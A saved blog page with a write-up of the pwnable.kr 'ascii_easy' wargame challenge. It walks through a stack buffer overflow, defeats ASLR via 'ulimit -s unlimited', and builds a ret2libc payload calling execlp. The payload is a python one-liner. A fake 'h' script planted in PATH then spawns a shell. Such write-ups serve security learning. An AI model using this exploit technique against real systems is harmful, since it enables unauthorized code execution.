<!DOCTYPE html>
<!-- saved from url=(0048)https://werew.tk/article/12/ascii_easy-pwnablekr -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="abstract" content="Articles about computers, cybersecurity, hacking and cracking, with a good dosage of writeups from famous challs, guides about programming and personal thoughts.">
    <meta name="description" content="Articles about computers, cybersecurity, hacking and cracking, with a good dosage of writeups from famous challs, guides about programming and personal thoughts.">
    <meta name="author" content="Werew, Luigi CONIGLIO">
    <meta name="keywords" lang="en" content="Hacking Cracking Writeups Programming Computer CTF Cybersecurity Linux Wargames Challenges Blog">

    <title>WereW's Blog</title>

    <link href="./WereW&#39;s Blog_files/bootstrap.min.css" rel="stylesheet">
    <link href="./WereW&#39;s Blog_files/custom.css" rel="stylesheet">
    <link href="./WereW&#39;s Blog_files/highlight.css" rel="stylesheet">
    <link rel="shortcut icon" href="https://werew.tk/static/images/favicon.ico" type="image/x-icon">
    <link rel="icon" href="https://werew.tk/static/images/favicon.ico" type="image/x-icon">

<script src="./WereW&#39;s Blog_files/embed.js" data-timestamp="1501644461609"></script><style type="text/css"></style><meta name="wecite_data" id="wecite-data" content="{&quot;Title&quot;:&quot;WereW&#39;s Blog&quot;,&quot;Author&quot;:&quot;&quot;,&quot;Abstract&quot;:&quot;&quot;,&quot;Image&quot;:&quot;&quot;,&quot;Keywords&quot;:&quot;&quot;,&quot;src_likes&quot;:&quot;0&quot;,&quot;src_shares&quot;:&quot;0&quot;,&quot;src_comments&quot;:&quot;0&quot;,&quot;src_reads&quot;:&quot;0&quot;,&quot;src_up&quot;:&quot;0&quot;,&quot;src_down&quot;:&quot;0&quot;,&quot;DateTime&quot;:&quot;2017-08-02 11:27:42&quot;,&quot;Reference Type&quot;:&quot;Web Page&quot;,&quot;Year&quot;:2017,&quot;SiteType&quot;:&quot;c3&quot;,&quot;URL&quot;:&quot;https://werew.tk/article/12/ascii_easy-pwnablekr&quot;}"><link rel="preload" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.eceee602870fc4ed49dc5f89e270689e.css"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.9fcff11af667507b1757062f0192b821.js"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.aafec1a2f3fa1e486216be04908b0e3a.js"><link rel="preload" as="script" href="https://disqus.com/next/config.js"><script src="./WereW&#39;s Blog_files/alfie.f51946af45e0b561c60f768335c9eb79.js" async="" charset="UTF-8"></script></head>

<body>

    <!-- Navigation -->
    <nav class="navbar navbar-inverse navbar-fixed-top navbar-hidden" role="navigation" style="top: -51px;">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="https://werew.tk/blog/">
		<img id="icon" src="./WereW&#39;s Blog_files/wolf.png" style="height: 30px; display: inline-block; margin-top: -5px" class="img-responsive img-rounded center-block">
			werew
		</a>
            </div>
            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse navbar-right" id="navbar-collapse">
                <ul class="nav navbar-nav ">
                    <li>
                        <a href="https://werew.tk/blog/">Blog</a>
                    </li>
                    <li>
                        <a href="https://werew.tk/stuffs">Stuffs</a>
                    </li>
                    <li>
                        <a href="https://werew.tk/about">About</a>
                    </li>
                </ul>

		<form class="navbar-form navbar-right" role="search">
                    <div class="input-group">
                        <input name="search" type="text" class="form-control">
                        <span class="input-group-btn">
                            <button id="search-button" class="btn btn-default" type="button">
                                <span class="glyphicon glyphicon-search"></span>
                        </button>
                        </span>
                    </div>
	      </form>  
	     </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container -->
    </nav>

    <!-- Page Content -->
     <div class="container">
     	<div id="page-content" class="row">

	

    <!-- Blog Post Content Column -->
    <div class="col-md-12">
    <!-- Blog Post -->
        <div class="text-center">
            <!-- Title -->
            <h1>Ascii_easy - Pwnable.kr</h1>
            <!-- Date, category , tags -->
            <p><span class="glyphicon glyphicon-time"></span> Posted on July 19, 2016</p>
            <p class="post-tags">
                <span class="glyphicon glyphicon-book"></span>
                <a href="https://werew.tk/category/Writeups/">Writeups</a> 
                <span class="glyphicon glyphicon-tags"></span>
                
                    <a href="https://werew.tk/search/%23Ret2libc/">Ret2libc</a> 
                
                    <a href="https://werew.tk/search/%23Buffer%20overflow/">Buffer overflow</a> 
                
                    <a href="https://werew.tk/search/%23ASLR/">ASLR</a> 
                
                    <a href="https://werew.tk/search/%23Ascii%20armor/">Ascii armor</a> 
                
            </p>
        </div>
        <hr>
    <!-- Post Content -->
        <div class="post-content">
            <p>As usual, we have a program: <code>ascii_easy</code>,  which has the permissions
to get the flag. After a fast reverse-engineering we can imagine that
the source code from where it comes from should look more or less
like this:</p>
<div class="codehilite"><pre><span></span><span class="cp">#define MEM 0x80000000</span>

<span class="kt">int</span> <span class="nf">is_ascii</span><span class="p">(</span><span class="kt">char</span> <span class="n">c</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x1f</span> <span class="o">||</span> <span class="n">c</span> <span class="o">&gt;</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// 0x20 == ' ' </span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>

    <span class="kt">char</span> <span class="n">local</span><span class="p">[</span><span class="mh">0xa8</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="n">MEM</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>

   <span class="kt">char</span><span class="o">*</span> <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span> <span class="n">MEM</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
                   <span class="n">PROT_READ</span>   <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
                   <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_FIXED</span>  <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
                   <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span>
            <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">!=</span> <span class="n">MEM</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"mmap failed. tell admin"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Input text : "</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0x18f</span><span class="p">){</span>
        <span class="n">mem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">is_ascii</span><span class="p">(</span><span class="n">mem</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"triggering bug..."</span><span class="p">);</span>
    <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>


<p>First of all we can note that the user input must contain
only (an exception could be made for the last character to be precise)
ascii values.</p>
<p>Furthermore it looks like there is a buffer overflow vulnerability: 
we have the control over the first <code>0x18f</code> bytes of the memory mapped 
by <code>mmap</code>. This data provided by the user is then copied into 
a much smaller buffer into the stack, this happens inside the functon <code>vuln</code>.</p>
<p>The stack is not executable:</p>
<div class="codehilite"><pre><span></span><span class="gp">ascii_easy@ubuntu:~$</span> readelf -l ascii_easy

<span class="go">Elf file type is EXEC (Executable file)</span>
<span class="go">Entry point 0x8048420</span>
<span class="go">There are 9 program headers, starting at offset 52</span>

<span class="go">Program Headers:</span>
<span class="go">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span>
<span class="go">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</span>
<span class="go">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</span>
<span class="go">      [Requesting program interpreter: /lib/ld-linux.so.2]</span>
<span class="go">  LOAD           0x000000 0x08048000 0x08048000 0x00834 0x00834 R E 0x1000</span>
<span class="go">  LOAD           0x000f14 0x08049f14 0x08049f14 0x00114 0x0011c RW  0x1000</span>
<span class="go">  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4</span>
<span class="go">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</span>
<span class="go">  GNU_EH_FRAME   0x0006e8 0x080486e8 0x080486e8 0x00044 0x00044 R   0x4</span>
<span class="hll"><span class="go">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span>
</span><span class="go">  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1</span>
</pre></div>


<p>...but it looks like the memory mapped by mmap is set to be executable,
so we could just use an ascii shellcode and somehow redirect the 
execution flow on the buffer mapped at the address <code>0x80000000</code>.</p>
<p>For this time I'm going to use a ret2libc style exploit, beside it is probably
what pwnable.kr is suggesting giving us these two hints:</p>
<ul>
<li>hint : ulimit</li>
<li>hint2: system, execl, execlp ... etc</li>
</ul>
<p>A fast search about ulimit and ret2libc exploits brought me these results:</p>
<ul>
<li><a href="http://stackoverflow.com/questions/17630745/why-ulimit-s-unlimited-can-de-aslr-in-overflow">http://stackoverflow.com/questions/17630745/why-ulimit-s-unlimited-can-de-aslr-in-overflow</a></li>
<li><a href="http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home">http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home</a></li>
</ul>
<p>An old implementation of <code>mmaps</code> doesn't use ASLR when the stack size limit
is set to unlimited, and guess what...the binary <code>ascii_easy</code> is a 32bits 
architecture. So <code>ulimit -s unlimited</code> should do the work in order to have
libc mapped always at the same address.</p>
<p>Note: appartently this "flaw" has been 
<a href="http://hmarco.org/bugs/CVE-2016-3672-Unlimiting-the-stack-not-longer-disables-ASLR.html">fixed</a>
recently.</p>
<p>Let's use <code>execlp</code> to spawn a shell. After the stack's size has been set to
unlimited let's figure out the address of this function:</p>
<div class="codehilite"><pre><span></span>(gdb) p execlp
$1 = {&lt;text variable, no debug info&gt;} 0x55643970 &lt;execlp&gt;
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ascii_easy/ascii_easy

Breakpoint 1, 0x08048516 in main ()
(gdb) p execlp
$2 = {&lt;text variable, no debug info&gt;} 0x55643970 &lt;execlp&gt;
</pre></div>


<p>As you can see the address doesn't change. And good news: each byte of this
address is a valid printable ascii character! B) Now let's find a null
terminated string containing the name of the shell:</p>
<div class="codehilite"><pre><span></span>(gdb) info sharedlibrary 
From        To          Syms Read   Shared Object Library
0x55555820  0x5556db5f  Yes (*)     /lib/ld-linux.so.2
0x555a1f70  0x556d635c  Yes (*)     /lib/i386-linux-gnu/libc.so.6
(*): Shared library is missing debugging information.

(gdb) find 0x555a1f70, +9999999, "sh\0"
0x55681299
0x556e9841
warning: Unable to access target memory at 0x55733bc5, halting search.
2 patterns found.
</pre></div>


<p>No luck here, both the address contains some character out of the range
that we are allowed to use.<br>
The function <code>execlp</code> uses the value of <code>$PATH</code> to search for the executables,
this means that we can just use whatever name and arrange things in order to
let <code>execlp</code> find the executable we want. Let's pick a very short name
to increase the possibilities to find a valid address:</p>
<div class="codehilite"><pre><span></span>(gdb) find 0x555a1f70, +9999999, "h\0"
0x555aacc0
0x555af742
0x555b449e
0x555b8def &lt;raise+31&gt;
0x555b8e07 &lt;raise+55&gt;
0x555c1399
0x555c1429
0x555c17e2
...
<span class="hll">0x556e3d3c
</span>...
</pre></div>


<p>Let's pick <code>0x556e3d3c</code> for example. Now we are ready to build the payload.</p>
<ul>
<li>We have a <code>0xa8</code> (168) characters long buffer to fill completely with
      whatever kind of character in order to arrive at the <code>ret</code> address</li>
<li>After the buffer there will be 4 bytes containing the value of the 
      frame pointer, we can just fill it in the same way as the buffer</li>
<li>We finally arrive at the return address. Here we need to put the address
      of the function we want to execute, in this case: <code>execlp</code></li>
<li>The next 4 bytes represent the address to where <code>execlp</code> will return
      if it will fail. Classic ret2libc exploits expect the address of the
      function <code>exit</code> to be here, but let's pass on it for today...</li>
<li>Now we have the arguments of <code>execlp</code>: twice the address to the string
      "h\0" + a NULL pointer</li>
</ul>
<p>and that's all. Time to get the flag:</p>
<div class="codehilite"><pre><span></span><span class="gp">ascii_easy@ubuntu:~$</span> mkdir /tmp/werew
<span class="gp">ascii_easy@ubuntu:~$</span> cat &gt; /tmp/werew/h
<span class="gp">#</span>!/bin/sh
<span class="go">/bin/sh</span>
<span class="gp">ascii_easy@ubuntu:~$</span> chmod +x /tmp/werew/h
<span class="gp">ascii_easy@ubuntu:~$</span> <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">"/tmp/werew:</span><span class="nv">$PATH</span><span class="s2">"</span>
<span class="gp">ascii_easy@ubuntu:~$</span> <span class="o">(</span>python -c <span class="s1">'print("A"*172 + "\x70\x39\x64\x55" + "exit" + "\x3c\x3d\x6e\x55"*2 + "\x00\x00\x00\x00" + "\n")'</span><span class="p">;</span> cat -<span class="o">)</span> <span class="p">|</span> ./ascii_easy
<span class="go">Input text : triggering bug...</span>
<span class="go">cat flag</span>
<span class="go">damn you ascii armor... **** * **** ** *** ***!! :(</span>
</pre></div>
        </div>
        <hr>

    <!-- Comments Form -->
    <div id="comment" class="well">
        <div id="disqus_thread"><iframe id="dsq-app5955" name="dsq-app5955" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./WereW&#39;s Blog_files/saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 404px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
            <script>

            /** RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
             * TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.  LEARN WHY DEFINING
             * THESE VARIABLES IS IMPORTANT:
             * https://disqus.com/admin/universalcode/#configuration-variables
             */

            var disqus_config = function () {
                this.page.url = window.location.href;  // Page's canonical URL variable
                this.page.identifier = 'article-12'; // Page's unique identifier variable
                this.page.title = 'Ascii_easy - Pwnable.kr';
                console.log(this.page);
            };
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');
                s.src = 'https://werew-tk.disqus.com/embed.js';
                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();

            </script>
            <noscript>Please enable JavaScript to view the 
                &lt;a href="https://disqus.com/?ref_noscript"&gt;comments powered by Disqus.&lt;/a&gt;
            </noscript>
        </div>
    </div>


        </div>


	
        <footer>
            <div class="row">
                <div class="col-lg-12">
                    <p>Copyright © werew.tk 2016</p>
                </div>
            </div>
        </footer>
	

    </div>

    <script src="./WereW&#39;s Blog_files/jquery.js"></script>
    <script src="./WereW&#39;s Blog_files/bootstrap.min.js"></script>
    <script src="./WereW&#39;s Blog_files/jquery.bootstrap-autohidingnavbar.js"></script>
    <script src="./WereW&#39;s Blog_files/custom.js"></script>



<script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/public/common.js"></script><script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/common/we-general.js"></script><iframe style="display: none;" src="./WereW&#39;s Blog_files/saved_resource(2).html"></iframe></body><div></div></html>